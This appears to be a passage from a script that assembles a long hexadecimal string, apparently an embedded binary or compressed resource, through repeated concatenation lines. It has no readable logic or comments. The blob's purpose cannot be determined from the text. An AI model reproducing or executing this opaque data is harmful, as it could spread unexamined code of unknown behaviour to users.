492A1018980FBBA181D4037F3C755C648A243EA0419CBE09F4EF4AEDE8BD2812950D8520B910D68DE521C02ABF5F255D82872782E8BF6F94A49314EB1FC225740BC42B5B78E09DB90E841A84915F5B2FE510A129B5B579805035057F2960C3113F111AC301597CFD00C5482D97860A104FFC5915A6B0C6BF150E8BC03B5A82334A047E194A04325135644D488D010B7FAB4CCF0B73F004705960B6D142E4019C5C4F1410F0AC659E5D414E37D5B3B9E4F03951613C4B197D1CD0AF0D9140A906A1251A0BF80D03F0BFF4D8AC46027358E103848E03C3F0E8D1D6808D1F07880346E3AAD2C456A3AD3F5F0918845C0042820EA4DE10726007008DDD33074A9B6C83CC6E8A21E1681EE1C7484C0CAB89269D77C8700308D3F8AE51201DF0975F811C20A7AEE0089014110ABE301B0A56D018510FC6E001B8634B31297095C613BBADE89341B492BF77EBDDFD00C0EB0F8F681CE40D6264C087BE1F20E138A90B373B75A1AF0CF6DBC87D0F2FE243F881C393A1A521168013DC01C02887D53DA270454C3945F3F074692C6D3DA4E4F4CEC416DFE42961429736C790C795708D202CE7A460FBD322D0EB164FF2D80DE20165DCF43280D88CBF38751679B8838816652584DC9D7D2E7C1C7D07C6F18CAEC8F3193F532BD474EB45C8D51E604D497F33F506927E36801C7E11F373D240D8EC7447B7EC34914213ED742689DCEFE1226E30800B03511809BFA42D7F676C8D06E207047829B265FF425F0E2570EC20890A4DA0F141BD338A99A0C33B0AF32E3D01DB8A3D7523B371B7A4454D5F61D61101C0ED6629AD8D5B8F274229123167A3995A7642FB42"
    $sHex &= "145F3708ECD136060CE94F02672084FF4914B050C3820AC917B18919816DFFBB2701749BEA0BCA6750E9B7215BC12B3FFA0BD0D1091D895041F541D4ED28190CFD50429D8CB773EB1D4DDB2F61298588EA4D83F220C24D6088107A44881F2C1AC0572C9FC6020180D881550D1B2699922B662010245012051498012D865AC0AE717B33C02721D320EC097049481C3FB40EC84B03C9ECEB0EB1FA2A27FF91CAA926A775E8151C7C2CED83154334D6E88DE4EC81A63E0D2003F40FC0F85BD108747B5C93A4835055ECE503221EF1D8BED4E2F52A48D4931F00D2008D00763CD8607DA76AD9EBC9490B90BE28CDBD2CA6FC2150E93BC703116F16580B20D74D2104E40DE446747018483176E058131B550655278C2098713AE8A4D87668B57985430C51BCBA936ACA2FB510D23407D2F0F018F051DEE80A621CBF2844604A691413C393411CEBC70339B00200DBB97F92D2D4008F1C9C4A2171AB5ACC8BD03A495983D69D9183F25A3F0D21AC0A2117D8500C168D552C07B845E06AFF3C1FE223AD0704CDCD09C4ADD5BA445D3222F48166AF10113D4243221C4B6512423A705033C018338F6CE057CE8D923A093721ADA10C5C2A082C12457C6AC452641341BCF8C417484CEC9BEC543E89C6B64CEC2E7906A8B03C168720C6161207AE628CB73070898FF918F611D5604B1CC9A84110C51D7AB822829FFC97566203974F427844526202AD974FC04DC0A6ADF499E6870198F403ECF56EB78806A1338A4A49883893BA361FA880AE64E0A30C140CB013AE71EC0A149D1726931897C1043474DA2C56E8CFA74CB88020130B00611BB08A52E808EB7A109A85A105DF4C1F9301ACC9ED04D62B8FC5281B39288C851B63358F257A913B0C3E637507180238D23A59D701653C086D350CBB2981DB6E18D5EB108AC49A2163457221EDDA40F5105E10284D6B20171CCE0C25F693EB25833820A1C5C02DD845020887C02EA1818A4A2AEF401BD08B4DD0D0A6E082C6112FBC09D30E308CB9BC29585B054F4372182110170162BC8634476B7B0829040443AB80040910EE34DDEA70CA982E56D2C2205BFFA94AFBD79240205410163BCAC54E6B878EA58140BB042850CAC2ECA7DBD83A08F369A16B6680840C97141C93F0ADB55B2894146108D08980A7A81B73C06F01A949D66D90C012E602EC5E26A1075A2AEF25DF8D56E0E02DD8CA08F19C26B6D0D02BD769CCF702A0758FB9D93BDFEB9ED86EB50974CD21DFA1156B16A5280D1320812760872A144B2B4F6F0402D200FCF005584AEEE7CC1C70726569D6324444E2A6558669A9D189B49B21172731485C02BB7B51403C3893C17D099510E042C01943743E3BCC6C0D0E67882C4EC4A2003709008C40ADB4093CA4C3211D6A262001D265A3023FEDBDCC"
    $sHex &= "41050147B8132074C1C0C8D722784FF8577C71CF7E3D3DD6AD0BDC317334694A2D013766FFE3D827B042AF03320113230CC3E823F0BC66D5E0EC3D1F25048C711BC4274833FB46F2EB1935CC3D42C0485B30C83C5C4973508FE8C80B84DD8696DF62E0E2203DB402AB842095CCFCF340699A46F74D5155D31178767A3901BC95E0042C44CAE0DB26D25D28720DDBF6C72B0E011B02BDA74CC8DD409DE0C40C9F11F4C4D7D714032E1C14C026F3C06D834951DA6B4EC47E11640884140FFCC8CB30C173B495303B026E300A55C546025EEB603BB43FCC003661A891B4FD60251DEF9FD44046B84BE49A21B5C8B181100C6D83A689E2D3A5068DF49F08488FB79FE52B1A292A1B7DB08316769F455098C03B1DD71FBF153A0C4CF095705D01AB0B355F40AC46214B835029052983AFB9228DC23D11BDEC92868BC425F43542C4DC8B035D5F24F08AC7EBABC1146E0C0B4F447D0C1088057865F3AC6E5B706DFF9A989A0C1F44D55A8156D135A224814743183637180905A4E224566F8036D2552B18D1147DA09384477D1C952054CC0663C8AC93ECBA49F8A0A080C6283C433C8B62025912F61E43052159E4298E27B0759D089B346B839888A615D9E8410968C16F08A60E32BE422477E4D5100EA4EB20964C26B70AAC900903B141084D2351F4342C8681457DA74186D50D59F80B695A93E04338E826F1D392E483DA9B89438FB8411FCD57A29081DC112A08135C4814D47D143D164C5E43F45FA7D420031612493B28260825E7D81E94F0EE74AEDC9A221C60FA2034F7208B0FB918067A507618D5EF34876305CB12894B45CB7603DFA0C711536A40F2DF455B51868152AD1C4AD8160D2B8B0179532006D0C8506A4B781B098AAA2557042D7920671E030F44F67F57278B0C74897741E0591A122605F232968864E0BD69C5B0E948DB27AB6981061610727288328F9D75251B07B2A3F03217DDE1F0EB34306DA755F57E35832A1032131421C4B0019636D3DFE1A98E32B318F6B40A64A01A6E452296479BC1A92B4E05C06A65DFDB70C00819403318607C07886C08C23CFF641B078C44C14AC2549958D3CBA7092316E81022BC589D380AD24B25A4DDF09D17B5704CD222A4FBB7651DF426739913D0C1D0BA1FC4D2961ADD4971DC62384345AD1FC5C80AC90B439B1EA292855756E7F3C741E0005929B94AD25AE8658D9B1006223688A7A57CE0F9B67D89C57C3AD30D5C930D7DE052A94C9585E0F8E0CE0CE01CAC89D4784B6686D434ACA5B4F82200AF108FC1F0A52B1B65ADED244E2106149B287CC406B1110B2AA10D561955EB2D2B6082CD522787E09030BA4929D258165EF029F8AE4035B8B06A0743804BBAA7C90693386A093188D4D8860CABF813EAAE88991CB302460A5BF264D494"
    $sHex &= "EB916FDD26BA163DB0513D917C3B74D00143CC37081C84D8C552221275D80191A8A1B8CFCFE8013731285277AABD208F049FF84A1A0DAEE4C17279F0B0B0446803AF678FDC23836B24BF73D5146CDD5603C0C54CA001AAC6E8041CA0BFA05E95243497A4A4A059B8C108C44989D52055D00A3C0D85D012ACC921249CA52CD3056BC2AC2145DCA77974E03C3A813117D89C69DC6A12F51F77A197A8CC14AB11B2C5D04B9E0709D0D198344A3CE007A4D036EB87A7749AC4A367323D0F8410C2E0394227D2490BE574EFE0848405187FCD272464951AD018EC5B2120150C8A452888A84A3F5795C918027D41C63636D743141FF9FCBD8896300598B39407892E553E9494B927FC0B901912C5C8EBACDE1A2419CDA1EE118935829191D6861E806E0A400C4C8204756CD609DD910343C89E89A16A85417527358147520B5FB1EB4CA02C3D2C9F148876C20516DFE4BBCC8D358191758E67D72EDFDDCB4491046D2828E4CC1DC050115C011B4CC4DDA2C77043C4A051327004564923BAFE3B81272D9B5004148A4D1C8848186B5AB89FB394C21E5D5CA64A54ACADE4248A20E034F2B002483A0726605CF42DB7224C5919B3EB8825734EDCBDDC49102B5A4FDC3D683D854BBD2CB98C74A807A0F20971E088428047E595A8A88B458888F75AEB5E98DD1A26CB8CC05D5C06CBC983832D9C08D86C075207B83C41B86EB858C9D5681BDFEC4084E6F06E89E59C3AC434140863F7B94D5A28610CDD76FB840C66C36884D59031A7454D8474414804514684C2BEE861978023C82B50457AEA3674EB24CA6FE0947A5AC44C930BA40067474BE62047B8C04D5C108489260C7A13E389D9EC2067A0972C9FDCB6D3F99EA1233A9037284868A1C77B908804115EE26F51E36B520BBB313B82F3A93F4CAB6A018EE02905C1E2957C9FE13443C2539AC586DC53B652844047C3A8ABE1426BE6D1C678E626D305BD781193073074EE8D175ABF7F678B6E8542D53B8BB50B04883BB09184DE04B2A85CB3DB58194FC4BB5CCDB43D1D71616766CC74F049CB2D35E5CEBE6C880037CC293B0C6A49F977E3F612095E042B7566234DA3A9C1A2248E184C694AA77B4B283441987657A61FF04016F8DA920BB840CE8885B8B5055F42750F7D668A20884118E899ABBB65F7BB197C6E8EEEBA1EE9E4FB5024B194E4040EC6245C32DCC5A3FD856C110B45785B4F83FEA18923A6853DF8A3E02E345D0C8750039D52D678024F464C6B4045114DEBAAF59D85854C0D075223CFACD29012ABE179C460902EBDDD31618B652939C269A0A450145458C2E5F90811D754B483067677252411102B4DD208EF833BE3BC1441E90E6C5B7B682E4384143BDB50D01628ED7617E49C684F1AD2C3139BD703C20AB0FFC30BDB9237E7D5F4"
    $sHex &= "83801FD664C5B36D8B10887187D5E47BB8D02DE91657DE60C96381A8D624A5991961E7AC9464B186C729336A7A99948471ACEE5D3E7C58B8DB9FB60575549D8881D23B0F79BFE05A8EF52E17EDDB418DDB1EB82034863AEB565C505A40789A8D5C6D5C6414A9BA5023D85CEF2A1B7B26F01123592364A79DC084274A207B5A4CD489BA42C078650D864737E4A07B1C7142DBB8041D1F3511446627CF3D2197B75FB1BCE845F05E4021D02DDF8DA944D8F725650E9DB02A5235F5EABD7EC2A04ED0C1044C2553DA82A813C8A0D03CB34F4548C9EE51247E20884A1ECB2A32E0D421A96C552563050B86151097616C19E98C91464C92F0087D6C95E86804D638319DC888100A255DD18CB6F0958EF0610A36DAC2114714515602B77902EB81EA6A7E07D33A521B1F631E65139861B825BDFD9876D161441DF415DF2F0E5B87962529129B193D41E0F09D1F026F68647103A70BD0749F6E493D1EEB544D1393FC9780D74821EB3BA7C1ADC1D24517A11BC32C49DCBA280D29E22AAF07C7191D8A5403F80CA952AAB6854D80111C3A5FF7129393BBF9FC02A6D004563763F09058C2954339C2E934ACCDFBB9EC01B87553475A35082102BF5F515817A5054628A494EFF322B44CD487026B25086EA90C3DD451694A1F89E52CB085C723D6D338C1E41B5C8BE88DEBCF64600529B191CCB0140ABFCDFD02CC1056EC7E4B6801E12939C27541DCA78D2FC1C636580174852C0914558204EEA4585834E282918F9B00AF5C414639EB9215D1C04A7337E52C69A89201DE6A2D20910B7ACCD02D0B2F45181F0069328C2DA10AC26C9F984CBB38880CA31AF30BC8DA26811B3E2CE59500AC49856F5DC20E60D58D87264258BF041B9653A3802025C42CC50AE4D55F22A05F24464D21DFF14417687B91C5326983914A832B615615019D2CBDC701A3B43F6840F51EA8A9830F87CC5D9500F1358BEEFC6FE25A5AD3018D5BBA61E84F7FEEEE4F0B0919D8478C5D59D341F91B67D48536AE59A9A323D8E263F1D0762DC44998A0D21CC5AC1440771FB904CE020D4A7C10A10B8D84115913486015AFFDA9CCCF15CFF34EDFEE1D063FB2631F02AB45210D643C0A1F99F0E4CEFCDB82DEBA9D2B1E1142880F10AD003A7547140312C208C26540BF58073C450B220CF94104626DB9612A4699A3238C10B68B9B1041CBA9A5491C0F1D10755BD03B8E11D946E0268247A17B31BE2B5B0BAFD919FCDC05C07985430527DC92940C318B4DF451471E7C9882DB5C9D0805DCF994CB2012082E08ECDD8A1006260DEC52A1568420D40A0CDFDACE77769FD66CD3F8E78611183C51155B93A50E261704E1E91115866BABF67F19659CF3D441AD82E3FD081D97A8FF0795A90003FF681E0797043B027B0BA50F08DF2D5D1216"
    $sHex &= "422F3B371D496013F40110DC5DC6DB26C975B1CD8481A1A147CB0AA7819F552355C42205FB91A92B6096C807A65A0143CC85015A401B1C61EEB05C90C0759BACED40A5334DCF0CC4852E51597D3F1C4AD0680B33F028E55744E0FDC40F83AF9127E052E3148D52256FD69756E7152AA4407C13F04508112780EB189630C4305BA4C485DA3B3143E0801396A4D1983980F387FE80D0D02372D423559C893340D92D9235170B85113D750DBEB07FB022CC670CC374D40B5834BE1A7304F20A0574B4D409B057D0FCE7E19F32D4F7D181C92080234228234A2C7700A901955078083FB14453A07C2C703FE0009C70360EF0029C4A25F92A7204431C1D3AB1F8071743C4356875877C2E976C686C7409EB78C9D08BB53B28084A1B18201E323C6C6083CACACA8D64956095641052E8807A12A3B0B2C11838589388C2115E28CC462E008170E0BC34EC464277BA4DBC176610484A12200A321504712287EC1F1ACA809E7905D8DBD6F7737E203033D52C292CC1CE161B4A69273822F82C7422ABB31728322247B0774AE73B105E50285807F85819749A763482B004CAC4B153029AE1E379A4308061E3E950AE241A28E24507A571C06C81E02C8F068E51E3DBB5E007E0830C271673C80F03BDBFF7E91B2674717294582B0F126B1445783F31D68758AA56236EACC352DBF44D8C5250831DC6DA5D1117756347F28432885C2E888CDF6CE242C734F48C494F3B491F3384E2308452DF724E00EDEC9C5D2C911BAF2D16095BD147821A7810F47CC7E0CB1E1748594873954C272E2A97484C2879B6F8D8878C3DEDC704823A2249BA5C64B396E5B21B201F40AB8D44401A9283CA44473C3FAC32D10E74245E2AE56C894A784CC258696B5C20E3C06AF0E5B081145A90C21C2D2860217DAB952910DF0E0AE91A15B4DFA830A2B9141CA81C68E172A48012B804B4A8D24AE1746C1C5938A8A0151DE3B4D06CF22D0DE34353032D4A619DB797205C8190C1B7CC9BAC012101FF1026A0891C291CAC82A595A70D3813934475FC269B438198F83001A2F0D830A0851C9A09D10535188A561C4F586A3834BC2B696E5BD1DC52E040FB005F0C10DA58C6B2EC0018601C934E04D09CDC0B2046003A521710521482C0F622BB756DB4264EC3E8B82035180B320AD08A3A16D2C604946A37F03BD0AF759BBFA1DD379A8C80977EE9251DA9D9444B9220A011402C044BF7604308E8201AE84B080F7A7E38EBD52211F97AFD244F2CB0AD5B9FE793F5C24EE9AD2013FD4669158BBFAF0F5A4AC64B146BFAE4CAD5A524190C147D2304870EC2FC40C680B406450AC9145AA14D73170552E9640CF881F8F43B105E82061197EB1C0046157C6E22AE0D0F131FC4C492718E9F1096540397FA1D9AEF1590C124EBFDE110E8A2"
    $sHex &= "3503F3CDDCB30CD2665511F10C1F56643429250AF97080D069037F950D3C82FF204F910B2020C92068DC4440CFF070DD927047D9F42062CCA2757730900A011BF87D58E22E7D4263C5472565FCD4AC1B02398BC2CCD279E8B98C9F17A3E88BE8EBEC8D314BC41CCFECF516450BC104741B8BFD1BBA3C127FC8ACCAC2A274B3C70B4FB276FF8B9876AD51AF56521DC8C684EC810112F346641A1F893B00ACC38427CCA62EA3894B71A831012DA48B100C01CC132063A3E010E8142632FFCC408F6C18114E38DB47B7096D011DEB1E6D018F9612257902EE00A410EE583282534EFFA8B9ACB11E09C9CC4BC1414901DF083FC11326DF114DF051357EF89864380B130506C07824194F4F5B04D9C76A0199100231F05E300346282BC1E0061C4F938C30BD81072F07FC03F00F903754080EC5F6D209C20164FB865761D78954E2C94B48480D8D849A0F918600A67E3F45486963A86C8D4C18BFA84CFC1C9E613211B5A57D1863418C148A4C0EECDF86702CCA88E0C564A089040D3849130883FA0CF0112C611E06015DEC1C688C287AB14C4BC3850A6616645C18FEBCAE4BD1388A41498822BC011348498F0E0D8C4DDE82CC6B26B454FCDF2978A750E5118B2FD8147D064EA54449F20C909AA3B14201D9844436326542CA81ED348DF7C0333F8C6DF50802CC4E1D0BDE0ABC192130499E75CCD08B2AE38A54021C313CFD830360A4031F3B84A747E31821A1FA11A32055F14218814F696F17750C6AB486FF6AB71465124372400BB2353A29A7C82F41305783E464080D778D59B7F089EC8790897D9D8ACA43C32AB594944A72F2D078D7BBF094625513C253180D8B9F4A8F7D2D72C7B8FB45FD75947F94986E13C24FD26AEBBF8530743A5B1C01978405CE2466CF128114EA18E725607C65518D7525BDB2AE224F0C73A8A1D03628DB5B3E0BC229B6C31CFC38248D31956F20EB546DDFC287268834C12DEC05DC3D78B4306F34DE57343C823C5E2F38DF1530B8169053601B8B8D1398A4A30D35E4DC4AE3C5563E2BEB0D5B607C0A5C3CDE932865031331310CDAB6EA4B05EF2C053924C702992268009BD0684008E2BC8B09E48239F395D81212CC42BB9B1A4D107528CC0A0347EB238300A324AB60E8122B2837C8930C642F80E4A0321869E9516B18296E75C0E30FC4F1A221560348D323E005C61BBC2A0151EF595A5A049768C5B4743BAFD47D914AC0587A319A80D4791E4230938DBA6D1D5619BDE153B8C4A14444BF10E4A18EF029E40B2D7843E904F30BB6B4D05C180C94B4343120251FF798951D36C6116C196CE8A4F5EC457974091170753052A8A73585EF5494B44AA823C346815383AC72A4D2F5207375198AE001B590B8055090EB58EBE6698919E63530ACA8D17026AE02F360CD"
    $sHex &= "2CC81CD490C1E4F324FE52330B90D1EB5E50D9A47D15BC7A1AD76B17A4C10134E8E23DDB72091FB35BDD9DF21446C19DBD5E5A04861D6796C12AB83A3590179250175849C877D2106CD23486EB59B5114C3A42FD08458CDD3F62C8C3B728F73F90C2BCB4F6C65ACED3FB1447C7445DC40F162792838740ABC4D865090DAD9FA9421ADC4CD5BC3F07925AC851E2005C4DECC2D744022BD46A60B1E61DED31905CBC1AFF0587363270D83155C82B0DB48F890F6AF13A88236152704936175579234FD3F0B8F8648098A07C34DEA41845118C6669D23C26B0195DB5124760B4C00D094D48A1B8B4E06E204DD2DEE410010575409CF2A5114E7E3C0BAC72883558563C1C359711A9ECEBE339CDAF60E28B3C048C2C6113DB96343DCF1CF0BD30D2E0A401855044E08A9F67461898AC6F1C9552B9808810F6E4E8B5824CA5ECF0432E3C99F8052B0482A278EB149EEE4C93C601D753C4CF03104A85286D1606FB0D15516DC95AEDD0AD6D78136589C97238F909751E597343D7EB47298609C5359FC6EA0B761BA49F8A12123B11E70324A490B0ED172662E01941FA5AB733FEBA436FBE8A5104881D80BD0B993DBD7B700F84F77E19F2122B729042E9ACE1AB0BBC1334B7B7AC852E172C2C906013087729E982363E75754664284C070C86F0B0D967AB8B962EDDD17C3081E696E1173434A69B102E6D1845F8F04CE8BACBD87FB608585BC9F1EB999605A947906BF020204DB2D80C0E7F5BACA4D0E6B321433B4DCD0016E7B8751AE1D91078942E05982C43C91CC2182421C0D06AACC901BB294BCD838351B401B438648F4DE1F925081914CE3A6F6D6856A7E00B870757A8C80CD61092DC73BE34F81124277275067C29C61E9013B30101E690EF144955BC25282CB3212897C42C48B535C3B2D48BDB268B588C633B068BD894BFB1927C0643AAC2E31879891212014ABC183B20A1284F880C5208020C0CC0A5496DE547C0E814D91CE4E77586AE2C7B3F0B59E6D2A5F2A0A00626037D3D3C3B399B566C2BA64A7DAC051D33D6854A48ACDF6D224C2EDE275E4113A31D9864F8A4EFBBBB7AAF6E6AFFE431027185AD8087780357DA2847F890545AD363A4BEC0903BB2C8AC4B752B72257414333984B9928942078C840B2497238080688C117DE1018D8909AC284065F1AB0F7C4B0A5A0D8CBA29E155415A63D345423CB91C6D5143A12850DF2498D823462E2C8C6BFB7C01ABEB0CA7BD6488E362891CF594E00CC71998B33D6187A44B87214678F61A6D952396356C1372D1F139D1908824CF9534909084B4B122609DC0E9820E2AE6841B3C03E91793003BA630F9F08852D5314D5CD04C879C7F908E90A9E85361848847D6404269668421477224908C5B09E96E266F2B82430BF879E008B325E958"
    $sHex &= "97C061ABA301AC42596FD290235C75BE07AC2BBD853F47894C2996F41F7058DE3D6B54961D1B91615CABC00C3D92E562BDE560FF110B04F13EF889AB3B317D3A579FFAD2BAD70519BD9788DB8902773862BB183C17244B01EB9ACEA5B4948A6D37E1B0146E698793F4A2A1993560609337F82611BD4F027D708B70AA657F8B4C90383C4F7D029106528B249558A340EA43439D6CEAFA02A1A9C1DB43E10198D7ADC74488492143F7C20FAA09826D0C8C142AD33891C249176010E0A89230715BF47F85738A441B75489E488418A1CF6028CC104505E53B3DC3E013DC56C2DA1A05C3DF07E6429A14000D8E11439A81BDC509F5F4F4D81D5008F915ED7D1500D37591053B663E38501D93D75E2D755C8076C1F839DCA34423051F4D97711AC4BAE7ADB937C1D02703E0A179349E09B5BF0EC421BA14EE8AA53039156CAC99BDFF61AD3242CF8DC65A4AE71EFBE7A48588F510EC10110D803D410C257618980C1F210104EE0289DB20A69AFADDEBA6BF1CAF021A44A3870513DBF89288CFE9873772154FFC1AE40198004C2584E411EB0E4A782D85D2830557435F780F85864FA12E841E87882CB77C12DDB46EE33B79563744BC022811743D0A68372EF1FF5122C863E2F0B9FC4E11096359B904EAB8327470252FC12268CD9D1D1B416D19346A4A9F50B01BC0F85B1BD8682BC33FBB5708565B2B1FA91F16AC80B0111F4CE22806BF785635804175B156113720D305187C11FA2864E2E25720754D30ABD211FBAC41A138C9C34A3DA4E4D4150309F0134699B82AF9F4973B813F7E88807D88482917914F585A09A1E861DA90C3DA18FC7125A8C55190E7EFEE16B0E03047F4089C97F81400FDD0019418839A10C0903C48B4D8DE897110D99F7AC587F8A204826BEF6F6945FD8A55EF8855C5C2010DA3408D0BCC974B9B64226B4AF39B7E2B27CEC08339007E1FC01012B78008B77C4A1D6615E421700D744CD20E06CE0105B4582F45242EEFEF6207172E1521786FBCBEA07548076B0B6BF806AD1DAFAE750C6BF6B4F5B0A5A07C08E0B89A7F0A9DA917B04C0F8E22E057D70A3DB05DA42D2C0709AC445AF54C00434D1CA88271FE48790D5F9C24D070D5A9366EA0A5C6250D88A422784DAEF8A2795D38D7520743071D4BB96FA222A8A465A8A5993BA48F414B67C02524824F1215C7E00D84F116ACB96A37818D5729B3EB497C3E315EC6EFD0C8791E2E6115029D95A660D5D40157464ACB83C0CF561612D225BC54475B1989FAC034D16AFA995B137E33D4E581A6C001DC2CB79CA9430D4D21E38C7EA7618415B574751AC6BC47D2D42C067290EB1832038C09A954F690079C9026C0F831082BAB8157B6E0306AFFE8D6690A4F5CA4430522A46E8C1C9CB82944056130C85F8271E936FC131F"
    $sHex &= "6B338005BD47B100D2022375B4005783FF60519694900BB9F44C48D539EC1060F00B3980C03075A46F165BC60FEDA4A540E9C310ACCC91CF801E0F38B16C07632CB9B82750E3A0E190A4A5DC3520972E56BF4B67C093A1C1ECA64BA049AE127FE8D8C6266A255DBB05384ADF5FC9D7D0921FD9D851DE7D008E08817785D059D642754BECB1190F1CB02DB88E51C0ED86BF26CEB9F413100E814BA48147A8B72761BD1BBD7014102F310C51C41C03059D6231C32973872CE5E4684B661BEE11160828C0E914D11A125CC3A59C349938A0A046526740B25FE43F4720709EC8C856C8DF8DB4363D01893313CC3920FC7A2629CBC8350066F6B4E034136A252C78102922F782082738D1E933064E86510CC8847753C4DD39C8CFC3181C71025BB83E450889802B363C1861B4AFCDFB26C2C304C2B5EC011C024196B41726706059574918F2DA16244597A956C46A5B15ECB0D122C2CBB1EA8357B2C7E4B74C08B898F00929DB1001032F2E570A761A6D6DC3EC40CDDD824C10C9C84918CE07BB20E8164BBB22E3B0A341D704E1B0D02EC2A827576C6499878F12242E24E1150AA54DAD974F4E8D7C48D4FCB03F023A18BA132E4358B81B8DA8DD9A99EA80D3C4062BDF1D89C2C287FB411BD18D0424A916569A63806E0CF86AA4D1C28C1518738CE12438DDBAD73605AC6473CE2DC602AD205705007435987F0C4A966EC5B7468155A0AEFF7D8D0609EBA0F7ED20A1015E87EB77A4364978D719FB345BD85375FC90805A30C2DCD2100323947D00FA300CAF982921345250F225515A2808AD1A04C6470F5E7F2E023D4063A308B849945E21FD2309A601872153308A428061118B63271CEE0141CA773B2701954276E891486E5F9474091768BD0E4D24A3F115184C7C14B5F4CBA59D24E00D105810C8C66DF6E700FE421068F0901E6870719B052B982953C4888C31CFC1154459BD9F5606AD4BD41815E9C465E05E6D4C29264CB58C6AFF5038D9D39D040238EC24712FF03AEF1D04EB28FEE7772D130D89904F4864973456379B0C95F00CB44E790DC42F049C2E0308100885F356D2E59C90490B6936716342D8467D2315AE8834CE007D25A33254320B1494B04BC44A5DC5B3C6E871BB3F01D701024D2C1420AEA4F2733B577BA80C03AC4B3B02EF2EF62AB4BD3B013EB358911490BCD3D80CE02D0F44C4EDF668010F9DA59111D8AC51690291CCCDC46B8D3245624CA2E350D91EC924DE6AF2AA51ACAF01E8A2CDAB612731DC91420BF95449BB98C0720C01048B56D84C628D061B608616E32D1C6B3EC1032330FFD439C64009034AD9EBC83D70102CDC45A0F071412D98388D1A069ECC730D81C0AA9E7D531D85E438C5D1907F1568CC2D05E4130416097CDB0C6064B22F818B4A476325545072"
    $sHex &= "C4B16D64351F32C0EC411BD98A51446D1C41EDABA8173CB5D30775152D625CD32A18536110675E425A83C2384C8486C30263C509A56E50185FD25881EFF214E4DF9C9E107CA77D1AEE59AD03380FE5C821BFDB2FAD0804FC4C603972C80400FEFC2C224B6C29ED42B836C29FF3D0E1A77AC5ACCE6A28F320A381E9329520A96F90F0BAC8DD58E1DBBAB1FCC208E0A8031A006D7486F48F9D210B3790E82D3439B054781476BEFFCF76A8C8E4D0C03FAA23806A3458BCD8DC0610078DFE3224A842F08DF9DE8DC6AF85C645D4059DCCAF199A2027C911161A804107C81098133FD5F9A4B24DA483F8A89D6BDBC4F8A0BC43A40663F80AEB0A4A81FE68B84BC002D358AE1F5796D093BFB02F4692788742B03175208D5B546B3439A4DBC3136C7CD9E5BB24570C98649C3D2DD6EC9074A00D88AF2D73B92DABD728A92289AB300F8D113D5730ADA488A154CD0E692388B83711F9B5C3C04D22F77CF8020FC4D5EB25278090F801010D0094E129E90C7D4D949275209E01BE673CE0006C207761003C3B16FC0450171F54A4712153906BD2111218A5196CD965D91DA4AC214DBE40951064C449E860A9ED52A8A8909420E59243F0832F7411250008A2805740BD0B169EA03B6E6C11418C23600DF5B8B95FFE293840E2D33E515C01735A7711E68893B016B5D938F05D1856D1F8BF1D3B48BEFB46DE1B7C591825DF15B1595524406FE11C48CE9148040E3FB62214384988009CAED2432C67E843EE38D3F0E1CB3BF7C922109A0F963D17878429428DAD40805E4A1C6B225CC0A58A483EC688C931742D9CB1208F251ABE99B7F92002009F36262AF041886D067D203D18E4749C45644B00046FD68346696EF32549C13099C0578D351CFCD62818CBF4AF1D422D2B12C6BC7C1597680CF22002018CDD992E78DFC2020BF7290A855BC06B42ADB04C29A39403FB89381A9B2186066546E3258C6EE7E092BCA3401757118043C28CEA5F7A6F9D1EF84EBA342171F7D0595D34C70B3F7D2E2C0D77A5F18D1FF785EF4B866623D7232DE3CD1C81EF89174CC5CACFDA1B0B857514C180B534159A41886F29A8B4719096906A185BBA7B721CDFAD1FDD9D5823F005ADBD62DD9397C0B7B4DCC08F5E1048EC867C71141FDED9C1734B3F79560F11D1EA446BC8215F08C30C085CDADDD2DC61814E000405C8ED861FDCBD4FBF16D8398190DB047B8CF8FE907041765DFCFE1F1180AE3D11B8F016D67ED0BD93DC8D1BDC7FDD5D8086982241031B721709C0115264DB2E294D802346D674242D01E81A2D80587ADCB94B204428CE7762E0D2A01A4475708C97128069ABBA31E6B261BF4120DD42229D4A00568044D38BC2AFABA514B5184C48C25A23162310C98D5F85B2AB95170B95047B5F880CEA4E50799C93"
    $sHex &= "38FACA7B2BD58C4BC7465F2E282C010EC28833C5DCCA6C4DB724FF2E0FE380D5A0DB1CE82AE864AF9475E54CE232F2E924D894EE8882BE850CB674B0C02A34D823FE41241384B240827C95E07883EA72D1173B7BC641D70C1895273B2B894F513205A89494F63C820F832ECA200D007710F2111E9E5CECF811EB12F35A77EB4C208374DF7983E13C73303086765EC83078B8277031141C441BF741927A9176AA0547DB090D526117E37DFC9A40413CA4622580BA41755D78DCC05EDB189B4A644CC09DE8869A561759184EB70C2C7FE98942200EDC6B4800E9A8B464895D8A6008AD66BFB0B038137A06D95A55F98578FE12CB45A88945820918AB05BB1FBBD601DFA905017487118B02A72974981A5197580FE251A13EFC49203F671F982F01CF1C75020BEA968DD24258E99FE2B849692D75A0473F458D0A18D1E2F440643641F1FBC6C091F003233B50087E40216308DFD2A28DB98C0B41219EB3038F94AEF7AF7BAA043D898D052E4C6FA75D5B844DDE78366E348C6C1F10046188D17747A78993F1C360D8B6C4C064EFECFDB118A00582850C18D9956899214AA2FE2E3714EBA8EB41CA001087BD743631F84EBA45A9B1F0046104B0A12B0B3B7C4A68E93FC85BF1D243044F305B0F8D83A56F083AFD9156250353CF49C1230829A6F3C20ED64D422BA7A7A4B33A5C52764DEB1680A51083D0191B1619692C0520F1569021D9827CAF80282DA1270C6CE39084AC0F8A0B80F9A9075F903B88429F04FA30A7B8810B249F30642BE96528CACFF1E37B67051131082F69D70851C0CC92877E5645E0556101F663E10619C897EDFCE4A4512D5F2385B5770121254DE1F0560D9C08359BA7A18C000BDD5697014CE40F5A6EEFB4277D056BE43076A9D15D3B55E0814F69D53D4F9F165295DD19425885A12455032F02E157A9EB6489D80076DFF564617403DB3811500FBDE0FF6AFFCD6D8D03D73D11580159040AD7E8610586AE7F246F705D160FD8EFDF180158E4B6275BE0764BC7FBFBC51D9F200631AFAD018135031F313ED5D0C61510B6141C328C006BF452053068681B4A7CB3B504564CE843B941179670815F8AD40106027220E81524D15ACF38EFAE1D6CEF6A15375749B934305E0C4CCB32AF9083EDD31AFBC75A1D2A527454D090F02617BB0B3624429B31F060B316ED9BBF00D15B708189321943EE982CE18C2EED9629A4BBE069F0E406C3D912BC3125B01922ABCB9090A660F8F014A5087BA63F4725B89289E1961AC510DC40A4264B9B818D3446A57F77605D39A7E3FF200D658426D7929ED0A9970F8EE411A2A69269FC40BAA2B143AD1921EA2241EC03E8ADA7A1ECE83208C37B0DBA0BB929C04718093DCFE0720248C4068CA068FED5D563BD83E307B8CCEB7AB441202E80"
